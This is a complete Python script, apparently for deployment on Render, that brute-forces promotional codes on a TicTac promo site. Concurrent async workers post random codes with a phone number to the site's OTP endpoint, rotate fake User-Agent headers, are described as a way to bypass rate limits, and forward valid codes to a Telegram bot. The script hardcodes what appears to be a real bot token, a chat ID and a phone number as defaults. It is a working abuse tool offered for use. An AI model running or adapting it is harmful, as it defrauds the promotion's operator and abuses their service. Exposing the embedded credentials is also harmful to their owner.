import asyncio
import httpx
import random
import string
import time
import os
from aiohttp import web
from datetime import datetime

# 🔑 ====== CONFIG — USES RENDER ENVIRONMENT VARIABLES ======
PHONE = os.getenv("PHONE", "7973366091")
BOT_TOKEN = os.getenv("BOT_TOKEN", "7960235034:AAGspuayD8vd-CnAkGp1LjpUv2RhcoopqKU")
CHAT_ID = os.getenv("CHAT_ID", "7177581474")
PORT = int(os.getenv("PORT", 10000)) # Render provides this automatically

URL = "https://jarpecarpromo.tictac.com/in/en/xp/jarpecarpromo/home/generateOTP/"

# Global Tracking
stats = {"total": 0, "found": 0, "start_time": time.time()}

def gen_code():
    chars = string.ascii_uppercase + string.digits
    prefix = random.choice(['M', 'T']) 
    return prefix + ''.join(random.choices(chars, k=5))

async def send_to_telegram(code):
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"🎯 **Valid TicTac Code Found!**\n\nCode: `{code}`\nPhone: `{PHONE}`",
        "parse_mode": "Markdown"
    }
    async with httpx.AsyncClient() as client:
        try:
            await client.post(api_url, json=payload)
            stats["found"] += 1
        except Exception as e:
            print(f"Telegram error: {e}")

async def worker(sem):
    """Asynchronous worker to bypass rate limits efficiently"""
    async with httpx.AsyncClient(timeout=15.0, http2=True) as client:
        while True:
            code = gen_code()
            async with sem:
                try:
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Linux; Android 10) Chrome/{random.randint(100,120)}.0.0.0 Mobile Safari/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                    }
                    r = await client.post(URL, data={'phone': PHONE, 'ccode': code}, headers=headers)
                    stats["total"] += 1
                    
                    if r.status_code == 200:
                        res = r.json()
                        if res.get('status') == 'success' or "otp" in res:
                            await send_to_telegram(code)
                except:
                    await asyncio.sleep(1) # Sleep on error

# --- MANDATORY FOR RENDER ---
async def handle_health_check(request):
    uptime = int(time.time() - stats["start_time"])
    return web.Response(text=f"Bot Running\nUptime: {uptime}s\nChecked: {stats['total']}\nFound: {stats['found']}")

async def main():
    # 1. Start Web Server for Render
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"✅ Health check server live on port {PORT}")

    # 2. Start Workers
    # sem = max simultaneous requests (Keep it low on Free Tier to avoid bans)
    sem = asyncio.Semaphore(10) 
    workers = [worker(sem) for _ in range(15)]
    await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
    
